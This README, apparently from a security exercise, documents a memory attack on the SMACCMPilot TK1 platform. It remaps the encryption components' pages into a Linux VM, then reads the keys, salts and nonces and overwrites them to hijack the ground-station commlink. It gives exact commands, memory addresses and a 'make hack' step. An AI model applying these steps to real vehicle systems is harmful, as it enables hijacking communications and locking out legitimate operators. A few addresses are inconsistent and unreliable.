# Memory attack on Linux Virtual Machine

This attack exploits a memory vulnerability to read and overwrite the communication crypto keys.
That way the attacker gains access to commlink, while denying access to the legitimate GCS operator.
These notes describe how the attack is constructed.

## Modifying the VM


The goal is to overwrite the nonce and salt for the encryption and
decryption functions. We accomplish this by mapping the relevant pages
of memory into the memory space of the VM. First we modify the VM to
tell it that we are inserting two extra pages to be loaded at a
specific memory address (we picked `0xd000000` somewhat arbitrarily).
To do this, run `make menuconfig` and select the option `Use hacked VM
configuration` under the smaccmpilot-tk1 application. Then recompile
the TK1 image.


## Modifying the capDL file

First we need to locate the memory where encryption information is
stored. The relevant data is in `build/arm/tk1/smaccmpilot-tk1` in the
binaries:

  - `Decrypt_inst_group_bin`
  - `Encrypt_inst_group_bin`

We start by looking at the memory for the decoder:
```
arm-none-eabi-objdump -x Decrypt_inst_group_bin
```

The crypto information is stored in the C variable
`ctx_dl_global_gec_sym_key_dec` which we can locate in the symbol
table from objdump:

```
00134478 l     O .bss	00001128 ctx_dl_global_gec_sym_key_dec
```

This means the variable will be at the virtual memory address
`0x00134478`. That means it's at offset `0x478` in page `0x134`. But,
this variable points to a rather large structure and it turns out the
information we want will actually spill on to the next page. So we
want to map page `0x135` into the VM memory space.

To do this we modify the `smaccmpilot.cdl` file located in the same
directory as the binaries. Here we find the page table for
`Decrypt_inst_group_bin`:

```
Decrypt_inst_group_bin_pd {
0x0: pt_Decrypt_inst_group_bin_0000
0x1: pt_Decrypt_inst_group_bin_0003
}
```

Each page table represents 2mb so the page table at 0x0 has entries
for addresses in the 0x00000000 - 0x02000000 range which covers the
address we are interested in (0x01350000). In particular, we want to
find the frame mapped at `0x135` in that page table:

```
pt_Decrypt_inst_group_bin_0000 {
...
0x135: frame_Decrypt_inst_group_bin_0065 (RWX)
...
}
```

First we need to mark this page as uncached since the Linux VM treats
it as uncached. We do this by adding the `uncached` attribute:

```
pt_Decrypt_inst_group_bin_0000 {
...
0x135: frame_Decrypt_inst_group_bin_0065 (RWX, uncached)
...
}
```

Then, we need to insert this frame into the cnode for the vm. We need
to leave one empty cnode and then place it in the next available slot:

```
Virtual_Machine_inst.vm_obj_cnode {
...
0x2a: Virtual_Machine_inst.vm_obj_irq_63
0x2b: Virtual_Machine_inst.vm_obj_irq_122
0x2d: frame_Decrypt_inst_group_bin_0065 (RWX)
...
}
```

We now repeat this process for Encrypt_inst_group_bin:

```
arm-none-eabi-objdump -x Encrypt_inst_group_bin
```

The relevant variable is `ctx_dl_global_gec_sym_key_enc` which we can
find in the symbol table:

```
00136548 l     O .bss	00001128 ctx_dl_global_gec_sym_key_enc
```

The virtual memory address is `0x00136548` which is page `0x136` with
offset `0x548`. Again the information we actually want will spill onto
the next page at `0x137`. Looking at the page table:

```
Encrypt_inst_group_bin_pd {
0x0: pt_Encrypt_inst_group_bin_0000
0x1: pt_Encrypt_inst_group_bin_0003
}
```

We see that we want offset `0x137` in `pt_Encrypt_inst_group_bin_0000` which is:

```
pt_Encrypt_inst_group_bin_0000 {
...
0x137: frame_Encrypt_inst_group_bin_0289 (RWX)
...
}
```

First we mark this as `uncached`:

```
pt_Encrypt_inst_group_bin_0000 {
...
0x137: frame_Encrypt_inst_group_bin_0289 (RWX, uncached)
...
}
```

We then add this to the VM's cnode:

```
Virtual_Machine_inst.vm_obj_cnode {
...
0x2a: Virtual_Machine_inst.vm_obj_irq_63
0x2b: Virtual_Machine_inst.vm_obj_irq_122
0x2d: frame_Decrypt_inst_group_bin_0065 (RWX)
0x2e: frame_Encrypt_inst_group_bin_0289 (RWX)
...
}
```

Now recompile and ensure that the cdl file is not overwritten by the
build process.


## Finding the key, salt, and nonce in the VM

Now we can boot the TK1 and try to locate the key, salt, and nonce for
both the decrypt and encrypt components. Within the VM, the pages we
mapped in are available at the memory range 0xd0000000 - 0xd002000.
Data 61 has provided the rw_mem.c tool in this repository which we can
use to read and modify memory.

First we can locate the keys since we know exactly what they are. To
read the memory we mapped in, do:

```
make read
```

And searching for the keys finds

```
0xd00004c0: 0xfe 0x45 0x2e 0x54 0x20 0xbf 0xb4 0x21 0x18 0x17 0x16 0x15 0x14 0x13 0x12 0x11 
0xd00004d0: 0x10 0x0f 0x0e 0x0d 0x0c 0x0b 0x0a 0x09 0x32 0x70 0x17 0xeb 0x26 0x63 0x05 0xfa
...
0xd0001590: 0x59 0x71 0x2b 0xaf 0xcf 0xf2 0xab 0x24 0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08 
0xd00015a0: 0x09 0x0a 0x0b 0x0c 0x0d 0x0e 0x0f 0x10 0xab 0x74 0xc9 0xd3 0xae 0x72 0xce 0xdb 
```

Thus the keys are at 0xd00004c8 and 0xd0001598. A make target is
available to read these keys:

```
root@tk1:~/vm_hack# make read-keys
./rw_mem -a 0xd00004c8 -s 16
0xd00004c8: 0x18 0x17 0x16 0x15 0x14 0x13 0x12 0x11 0x10 0x0f 0x0e 0x0d 0x0c 0x0b 0x0a 0x09 
./rw_mem -a 0xd0001598 -s 16
0xd0001598: 0x01 0x02 0x03 0x04 0x05 0x06 0x07 0x08 0x09 0x0a 0x0b 0x0c 0x0d 0x0e 0x0f 0x10 
```

We can also find the salts by searching for them directly:

```
0xd0000580: 0x00 0x00 0x00 0x00 0x50 0x00 0x00 0x00 0x50 0x00 0x00 0x00 0x08 0x07 0x06 0x05 
0xd0000590: 0x04 0x03 0x02 0x01 0x00 0x00 0x00 0x00 0x00 0x79 0x0c 0x00 0x00 0x00 0x00 0x00 
...
0xd0001650: 0x00 0x00 0x00 0x00 0x50 0x00 0x00 0x00 0x50 0x00 0x00 0x00 0x11 0x12 0x13 0x14 
0xd0001660: 0x15 0x16 0x17 0x18 0x00 0x00 0x00 0x00 0x79 0x0c 0x00 0x00 0x00 0x00 0x00 0x00
```

Thus the salts are at 0xd00058c and 0xd000165c. A make target is
available to read these salts:

```
root@tk1:~/vm_hack# make read-salts
./rw_mem -a 0xd000058c -s 8
0xd000058c: 0x08 0x07 0x06 0x05 0x04 0x03 0x02 0x01 
./rw_mem -a 0xd000165c -s 8
0xd000165c: 0x11 0x12 0x13 0x14 0x15 0x16 0x17 0x18 
```

Finding the nonces is tricker because they are initially all zero so
we can't just search for them. Instead we save the results of `make
read` over several requests to the odroid and diff the resulting files
to find the nonce. After doing 4758 requests we can find the nonces here:


```
0xd0000590: 0x04 0x03 0x02 0x01 0x00 0x00 0x00 0x00 0x00 0x96 0x12 0x00 0x00 0x00 0x00 0x00 
0xd00005a0: 0x00 0x00 0x12 0x95 0x07 0x14 0xa5 0x56 0x62 0x19 0x88 0x89 0x37 0xbe 0x64 0xaf
...
0xd0001660: 0x15 0x16 0x17 0x18 0x00 0x00 0x00 0x00 0x96 0x12 0x00 0x00 0x00 0x00 0x00 0x00 
0xd0001670: 0x00 0x00 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 
```

The nonce is a uint64 stored in little endian format. The nonces are
at 0xd0000599 and 0xd0001668. A make target is available to read these
nonces:

```
root@tk1:~/vm_hack# make read-nonces
./rw_mem -a 0xd0000599 -s 8
0xd0000599: 0x96 0x12 0x00 0x00 0x00 0x00 0x00 0x00 
./rw_mem -a 0xd0001668 -s 8
0xd0001668: 0x96 0x12 0x00 0x00 0x00 0x00 0x00 0x00
```

Now the attack simply overwrites the salts with the attacker's salts
(all zeros) and resets the nonces to zero so that the attacker can
syncronize with the Odroid. A make target is available to do these
overwrites:

```
root@tk1:~/vm_hack# make hack
./rw_mem -a 0xd000058c -s 8 -w -h 0x00
./rw_mem -a 0xd000165c -s 8 -w -h 0x00
./rw_mem -a 0xd0000599 -s 8 -w -h 0x00
./rw_mem -a 0xd0001668 -s 8 -w -h 0x00
```
